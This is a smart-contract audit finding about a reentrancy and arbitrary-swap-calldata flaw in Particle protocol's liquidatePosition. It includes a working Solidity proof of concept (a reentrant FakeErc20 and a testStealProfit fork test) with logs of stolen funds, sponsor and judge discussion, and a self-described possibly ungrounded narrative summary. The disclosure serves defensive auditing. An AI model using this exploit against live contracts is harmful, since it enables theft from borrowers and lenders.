---
id: 19642
severity: "High"
---

# liquidatePosition

## Description

When the Loan expires, and `RenewalCutoffTime` has been set, anyone can execute the liquidation method `liquidatePosition()`.  
Execution path: `liquidatePosition()` -> `_closePosition()` -> `Base.swap(params.data)`

The problem is that this `params.data` can be arbitrarily constructed by the liquidator. As long as there is enough `amountReceived` after the exchange for repayment, it will not `revert`.

In this way, you can maliciously construct `data` and steal the extra profit of the liquidator. (At least `amountReceived` must be guaranteed)

Assume:

collateral + tokenPremium = 120  
repay minimum `amountReceived` only need 100 to swap  
so borrower Profit 120 - 100 = 20

1. create fakeErc20 and fakePool (token0 = fakeErc20,token1 = WETH)
2. execute liquidatePosition():pool = fakePool , swapAmount = 120 (all collateral + tokenPremium)
3. in fakeErc20.transfer() reentry execute reply 100 equivalent `amountReceived` (transfer to ParticlePositionManager)
4. liquidatePosition() success , steal 120 - 100 = 20

## Proof of Concept

Add to `LiquidationTest.t.sol`:

```solidity
contract FakeErc20 is ERC20 {
    bool public startTransfer = false;
    address public transferTo;
    uint256 public transferAmount;
    constructor() ERC20("","") {
    }    
    function set(bool _startTransfer,address _transferTo,uint256 _transferAmount) external {
        startTransfer = _startTransfer;
        transferTo = _transferTo;
        transferAmount = _transferAmount;
    }
    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        //for pay loan , usdc
        if(startTransfer) ERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48).transfer(transferTo,transferAmount);
        return true;
    }    
}

FakeErc20 public fakeErc20 = new FakeErc20();
function uniswapV3MintCallback(
    uint256 amount0Owed,
    uint256 amount1Owed,
    bytes calldata
) external {
    ERC20 token0 = address(fakeErc20) < address(WETH) ? ERC20(fakeErc20):ERC20(address(WETH));
    ERC20 token1 = address(fakeErc20) < address(WETH) ? ERC20(address(WETH)):ERC20(fakeErc20);
    if (amount0Owed > 0) token0.transfer(msg.sender,amount0Owed);
    if (amount1Owed > 0) token1.transfer(msg.sender,amount1Owed);
    
}    
function testStealProfit() public {
    //1. open Position
    _openLongPosition();
    _addPremium(PREMIUM_0, PREMIUM_1);
    vm.warp(block.timestamp + 1 seconds);
    _renewalCutoff();
    vm.warp(block.timestamp + 7 days);

    //2. init fake pool
    address anyone = address(0x123990088); 
    uint256 fakePoolGetETH;
    uint256 payUsdcToLp;
    uint256 amountToAdd;
    bytes memory data;
    vm.startPrank(WHALE);
    WETH.transfer(address(this), 1000e18);
    fakeErc20.mint(address(this), 1000e18);
    vm.stopPrank();
    IUniswapV3Pool fakePool = IUniswapV3Pool(uniswapV3Factory.createPool(address(WETH), address(fakeErc20), FEE));
    fakePool.initialize(TickMath.getSqrtRatioAtTick((_tickLower + _tickUpper) / 2 ));
    fakePool.mint(address(this), _tickLower, _tickUpper, 1e18, "");

    //3. compute swap amount
    {
        (,uint128 token1Owed,,uint128 token1Premium,,uint256 collateral1) = particleInfoReader.getOwedInfo(SWAPPER, LIEN_ID);
        (uint40 tokenId, uint128 liquidity, , , , , , ) = particleInfoReader.getLien(SWAPPER, LIEN_ID);
        (payUsdcToLp, amountToAdd) = Base.getRequiredRepay(liquidity, tokenId);

        uint256 amountSwap = collateral1 + token1Premium - amountToAdd - token1Owed - (token1Premium * LIQUIDATION_REWARD_FACTOR /BASIS_POINT);
        
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(fakeErc20),
            fee: FEE,
            recipient: anyone,
            deadline: block.timestamp,
            amountIn: amountSwap,
            amountOutMinimum: 0,
            sqrtPriceLimitX96:0
        });
        data = abi.encodeWithSelector(ISwapRouter.exactInputSingle.selector, params);
        //4. execute liquidatePosition pay usdc and get eth
        vm.startPrank(WHALE);
        USDC.transfer(address(fakeErc20), payUsdcToLp);
        fakeErc20.set(true,address(particlePositionManager),payUsdcToLp);
        vm.stopPrank();     
        uint256 fakePoolEthBalance = WETH.balanceOf(address(fakePool));
        vm.startPrank(anyone);
        particlePositionManager.liquidatePosition(
            DataStruct.ClosePositionParams({lienId: uint96(LIEN_ID), amountSwap: amountSwap, data: data}),
            SWAPPER
        );
        vm.stopPrank(); 
        fakePoolGetETH = WETH.balanceOf(address(fakePool)) -  fakePoolEthBalance;                
    }
   
    //5. show steal usdc
    console.log("steal eth :",fakePoolGetETH);  
    console.log("pay usdc:",payUsdcToLp / 1e6);  
    uint256 usdcBefore = USDC.balanceOf(address(fakePool));
    _swap(address(fakePool),address(WETH),address(USDC),FEE,fakePoolGetETH); //Simplify: In reality can use fakeErc20 swap eth
    console.log("steal eth swap to usdc:",(USDC.balanceOf(address(fakePool)) - usdcBefore) / 1e6);  
    console.log("steal usdc:",(USDC.balanceOf(address(fakePool)) - usdcBefore - payUsdcToLp)/1e6);  
}
```

```bash
forge test -vvv --match-test testStealProfit --fork-url https://eth-mainnet.g.alchemy.com/v2/xxx --fork-block-number 18750931
```

Logs:
```
steal eth : 790605367691135637
pay usdc: 737
steal eth swap to usdc: 1856
steal usdc: 1118
```

## Recommendation

It is recommended to remove `data`.  
The protocol already knows the `token0/token1` and `params.amountSwap` that need to be exchanged, which is enough to construct the elements needed for swap.

This is a great finding around our arbitrary swap data. The reason we have it is that we wanted to use 1inch to route for the best price when swapping.

In your recommendation

It is recommended to remove data.  
The protocol already knows the token0/token1 and params.amountSwap that need to be exchanged, which is enough to construct the elements needed for swap.

That means we use the `swapExactInput` inside our `Base.swap` to replace `data`, right?

— 

Want to discuss more here though, is this attack applicable to _any_ ERC20 tokens? This step:

in fakeErc20.transfer() reentry execute reply 100 equivalent amountReceived (transfer to ParticlePositionManager)

can’t be generally triggered for normal ERC20, right? There isn’t a callback when receiving ERC20 (unlike ERC721 on receive callback)?

How often does a normal ERC20 have a customized callback to allow reentrancy like the `FakeErc20` in example? Thanks!

Agree with this finding and it’s severity.

Acknowledging the issue as it indeed can happen if a malicious erc20 is designed for our protocol. But unlikely to patch completely because otherwise we wouldn’t be use 1inch or other general router.

We disagree with the severity though, because this attack, at its current design, can’t apply to all ERC20 in general. Wardens please do raise concern if our understanding is incorrect here. Thanks!

So to clarify, for this attack to be possible, the protocol would need to have a pool containing a malicious erc20 token and have significant liquidity in this pool? @wukong-particle 

Can this attack not also be possible with any token with callbacks enabled?

Also, regardless of a malicious erc20 token, we could still extract significant value by sandwiching attacking the swap no?

Consider the following snippet of code:

```solidity
function swap(
    IAggregationExecutor caller,
    SwapDescription calldata desc,
    bytes calldata data
)
    external
    payable
    returns (uint256 returnAmount, uint256 gasLeft)
{
    require(desc.minReturnAmount > 0, "Min return should not be 0");
    require(data.length > 0, "data should not be empty");

    uint256 flags = desc.flags;
    IERC20 srcToken = desc.srcToken;
    IERC20 dstToken = desc.dstToken;

    bool srcETH = srcToken.isETH();
    if (flags & _REQUIRES_EXTRA_ETH != 0) {
        require(msg.value > (srcETH ? desc.amount : 0), "Invalid msg.value");
    } else {
        require(msg.value == (srcETH ? desc.amount : 0), "Invalid msg.value");
    }

    if (!srcETH) {
        _permit(address(srcToken), desc.permit);
        srcToken.safeTransferFrom(msg.sender, desc.srcReceiver, desc.amount);
    }

    {
        bytes memory callData = abi.encodePacked(caller.callBytes.selector, bytes12(0), msg.sender, data);
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory result) = address(caller).call{value: msg.value}(callData);
        if (!success) {
            revert(RevertReasonParser.parse(result, "callBytes failed: "));
        }
    }

    uint256 spentAmount = desc.amount;
    returnAmount = dstToken.uniBalanceOf(address(this));

    if (flags & _PARTIAL_FILL != 0) {
        uint256 unspentAmount = srcToken.uniBalanceOf(address(this));
        if (unspentAmount > 0) {
            spentAmount = spentAmount.sub(unspentAmount);
            srcToken.uniTransfer(msg.sender, unspentAmount);
        }
        require(returnAmount.mul(desc.amount) >= desc.minReturnAmount.mul(spentAmount), "Return amount is not enough");
    } else {
        require(returnAmount >= desc.minReturnAmount, "Return amount is not enough");
    }

    address payable dstReceiver = (desc.dstReceiver == address(0)) ? msg.sender : desc.dstReceiver;
    dstToken.uniTransfer(dstReceiver, returnAmount);

    emit Swapped(
        msg.sender,
        srcToken,
        dstToken,
        dstReceiver,
        spentAmount,
        returnAmount
    );

    gasLeft = gasleft();
}
```

The router has been approved as a spender and can therefore transfer `desc.amount` to `desc.srcReceiver`. Subsequently, an external call is made `caller` which is also controlled by the liquidator. Here, they would simply have to perform the swap themselves and transfer the expected amount back to the contract. Keeping any excess. This is an issue for `AggregationRouterV4` and I would expect there are similar types of issues in other DEX aggregator contracts.

`AggregationRouterV5` is also vulnerable to the same issue.

```solidity
function swap(
    IAggregationExecutor executor,
    SwapDescription calldata desc,
    bytes calldata permit,
    bytes calldata data
)
    external
    payable
    returns (
        uint256 returnAmount,
        uint256 spentAmount
    )
{
    if (desc.minReturnAmount == 0) revert ZeroMinReturn();

    IERC20 srcToken = desc.srcToken;
    IERC20 dstToken = desc.dstToken;

    bool srcETH = srcToken.isETH();
    if (desc.flags & _REQUIRES_EXTRA_ETH != 0) {
        if (msg.value <= (srcETH ? desc.amount : 0)) revert RouterErrors.InvalidMsgValue();
    } else {
        if (msg.value != (srcETH ? desc.amount : 0)) revert RouterErrors.InvalidMsgValue();
    }

    if (!srcETH) {
        if (permit.length > 0) {
            srcToken.safePermit(permit);
        }
        srcToken.safeTransferFrom(msg.sender, desc.srcReceiver, desc.amount);
    }

    _execute(executor, msg.sender, desc.amount, data);

    spentAmount = desc.amount;
    // we leave 1 wei on the router for gas optimisations reasons
    returnAmount = dstToken.uniBalanceOf(address(this));
    if (returnAmount == 0) revert ZeroReturnAmount();
    unchecked { returnAmount--; }

    if (desc.flags & _PARTIAL_FILL != 0) {
        uint256 unspentAmount = srcToken.uniBalanceOf(address(this));
        if (unspentAmount > 1) {
            // we leave 1 wei on the router for gas optimisations reasons
            unchecked { unspentAmount--; }
            spentAmount -= unspentAmount;
            srcToken.uniTransfer(payable(msg.sender), unspentAmount);
        }
        if (returnAmount * desc.amount < desc.minReturnAmount * spentAmount) revert RouterErrors.ReturnAmountIsNotEnough();
    } else {
        if (returnAmount < desc.minReturnAmount) revert RouterErrors.ReturnAmountIsNotEnough();
    }

    address payable dstReceiver = (desc.dstReceiver == address(0)) ? payable(msg.sender) : desc.dstReceiver;
    dstToken.uniTransfer(dstReceiver, returnAmount);
}
```

As such, I think this is vulnerable to all erc20 tokens.

Hmm ok I see, this is more like a malicious pool attack rather than malicious erc20 token attack. It’s using the vulnerability from swap aggregator (e.g. the arbitrary call of `address(caller).call{value: msg.value}(callData);` in `AggregationRouterV5`.

To fix this, we can restrict the `DEX_AGGREGATOR` to be Uniswap’s `SwapRouter` (deployed at 0xE592427A0AEce92De3Edee1F18E0157C05861564 on mainnet). This router interacts with Uniswap only (it has multicall, so we can use `data` to choose multi-path if needed). 

Will this resolve this vulnerability? @0xleastwood @adriro @bin2chen 

@wukong-particle I’m sorry, I didn’t quite understand what you mean. In the POC, it use Uniswap’s SwapRouter and Pool.

In my personal understanding, if the liquidator still passes in `data`, then we need to check the security of this data, but it’s quite difficult to check. So I still keep my opinion, `liquidatePosition()` ignores the incoming `data`, and the method constructs data internally, which is how to determine the swap slippage is a problem.

Ok understood, based on the PoC provided here and the 1inch v5 vulnerability raised by the judge, I think we should remove the raw data from input parameters altogether. We will use direct swap (with the fee as input to select which pool to execute the swap). Thanks for the discussion! 

So Uniswap’s `SwapRouter` contract is vulnerable to something slightly different. We can control the path at which tokens are swapped, stealing any profit along the way. Additionally, all DEX aggregators would be prone to sandwich attacks. 

I think there can be some better input validation when it comes to performing the actual swap. If possible we should try to avoid any swaps during liquidation as this leaves the protocol open to potential bad debt accrual and issues with slippage control. Validating slippage impacts the liveness of liquidations so that is also not an ideal solution. It really depends on what should be prioritised here?

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability resides in the liquidation routine of the Particle protocol where the function liquidatePosition ultimately forwards an arbitrary calldata blob (params.data) to the Base.swap implementation. The protocol assumes that the caller will provide a well‑formed swap description, but it never validates the contents of the data field. Because the swap is performed through a generic DEX aggregator (e.g., 1inch or Uniswap V3 router) the liquidator can craft a custom swap that routes through a malicious pool containing a fake ERC20 token. The fake token implements a transfer callback that, during the swap, re‑enters the liquidation flow and supplies just enough amountReceived to satisfy the repayment check, while the remaining swapped value stays with the liquidator. In practice the attacker creates a fake pool where token0 is the malicious ERC20 and token1 is WETH, supplies the full collateral plus any premium as the swap amount, and encodes a call to the router that swaps this amount for the fake token. When the fake token’s transfer is executed, it triggers a secondary transfer of the required repayment amount back to the ParticlePositionManager, allowing the liquidation to succeed. The excess value (collateral + premium − repayment) is retained by the attacker, effectively stealing profit from the borrower. This can be executed whenever a loan has expired and the RenewalCutoffTime flag is set, because any address is permitted to call liquidatePosition. The affected parties are borrowers who expect to receive their full collateral after liquidation, lenders who rely on correct debt settlement, and the protocol itself which may incur unexpected bad‑debt or loss of funds. The issue was discovered during a security audit when the auditors constructed a proof‑of‑concept using a fake ERC20 and a fake Uniswap V3 pool to demonstrate profit extraction. The problem is subtle because the swap call appears legitimate and the protocol only checks that the amountReceived meets a minimum threshold; it does not verify that the swap path or token contracts are trustworthy. From a user’s perspective the borrower sees a reduced balance after liquidation – the expected collateral is partially missing, and the protocol’s accounting no longer matches the original loan terms. This class of bug can be described as an “unrestricted external call with unchecked calldata leading to profit‑stealing via malicious token callbacks”. To remediate the issue the protocol should eliminate the arbitrary data parameter from the liquidation path, enforce that the swap uses only known token pairs and a fixed amount, whitelist a single trusted router (e.g., Uniswap’s SwapRouter) or perform the swap internally, and add strict validation of slippage and return amounts. By removing the ability for a liquidator to supply custom calldata, the protocol prevents re‑entrancy through malicious token callbacks and ensures that liquidation proceeds only with the intended asset exchange, preserving borrower funds and protocol integrity.
